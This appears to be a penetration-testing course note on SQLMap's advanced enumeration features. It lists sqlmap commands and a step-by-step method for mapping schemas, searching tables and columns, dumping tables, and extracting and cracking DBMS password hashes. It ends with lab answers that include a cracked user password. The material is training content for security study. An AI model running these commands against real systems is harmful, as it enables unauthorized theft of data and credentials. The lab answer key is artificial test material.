# NOTE — Advanced Database Enumeration

## ID
404

## Module
SQLMap Essentials

## Kind
notes

## Title
Section 8 — Advanced Database Enumeration

## Description
Covers SQLMap's advanced enumeration features — schema mapping, keyword-based search across databases/tables/columns, automatic password hash cracking, and DB user credential extraction.

## Tags
sqlmap, sqli, schema, search, password-cracking, hash

## Commands
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --schema --batch
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --search -T <KEYWORD> --batch
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --search -C <KEYWORD> --batch
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --dump -D <DB> -T <TABLE> --batch
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --passwords --batch
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?<PARAM>=1' --all --batch

## What This Section Covers
When you don't know the exact table or column name holding the data you want, SQLMap lets you search across the entire database using LIKE queries. It also auto-detects password hashes in dumped data and offers to crack them on the spot using a built-in 1.4M-entry dictionary. Separately, `--passwords` targets DBMS system credential tables (e.g., `mysql.user`) rather than application tables.

## Methodology

1. **Map the full schema** — use `--schema` to get every table and column across all databases at once, giving you a bird's-eye view of the architecture:
   `sqlmap -u 'http://<TARGET>:<PORT>/case1.php?id=1' --schema --batch`

2. **Search for tables by keyword** — use `--search -T <keyword>` to find tables with names matching a LIKE pattern (e.g., `user`):
   `sqlmap -u '...' --search -T user --batch`

3. **Search for columns by keyword** — use `--search -C <keyword>` to find columns across all databases (e.g., `pass` to find password columns, `style` to find style-related columns):
   `sqlmap -u '...' --search -C pass --batch`

4. **Dump and auto-crack** — when you `--dump` a table containing hashes, SQLMap recognizes 31 hash formats and offers dictionary-based cracking automatically. Use `--batch` to accept defaults (cracks with built-in wordlist, no suffixes):
   `sqlmap -u '...' --dump -D master -T users --batch`

5. **Extract DBMS credentials** — `--passwords` pulls hashes from system tables (e.g., `mysql.user`) and cracks them, separate from application-level password dumps:
   `sqlmap -u '...' --passwords --batch`

6. **Nuclear option** — `--all --batch` enumerates and dumps everything accessible. Runs a long time but captures all data to local output files for offline review.

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Column containing "style" in its name (Case #1) | `PARAMETER_STYLE` | `--search -C style --batch` — found in `information_schema.ROUTINES` |
| Q2: Kimberly's password (Case #1) | `Enizoom1609` | `--dump --batch` on the `users` table — SQLMap auto-cracked the SHA1 hash |

## Key Takeaways
- `--search` uses SQL `LIKE` under the hood — it searches identifier names (table/column names), not data content.
- SQLMap's auto-crack supports 31 hash types and uses a 1.4M-entry wordlist. If the password isn't random, there's a decent chance it cracks automatically.
- `--passwords` targets DBMS system credential tables (database server users), while `--dump` on application tables gets app-level user credentials — they're different things.
- `--all --batch` is the "grab everything" switch but can run for a very long time on large databases — better to target specific tables when possible.
- Cracked passwords appear in parentheses next to the hash in SQLMap output (e.g., `d642ff0f...deba0 (Enizoom1609)`).

## Gotchas
- `--search -C pass` will match across system databases too (e.g., `mysql.user`), so expect noise — focus on application databases in the results.
- Auto-cracking only works if `--batch` is set or you answer `Y` at the prompt. Without `--batch`, SQLMap asks multiple questions (store hashes? crack? which wordlist? suffixes?) and waits.
- `--schema` can be slow on databases with many tables — it queries `INFORMATION_SCHEMA` for every table and column.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|sqlmap-fundamentals]]  
← [[07-database-enumeration]] | [[09-bypassing-protections]] →
<!-- AUTO-LINKS-END -->
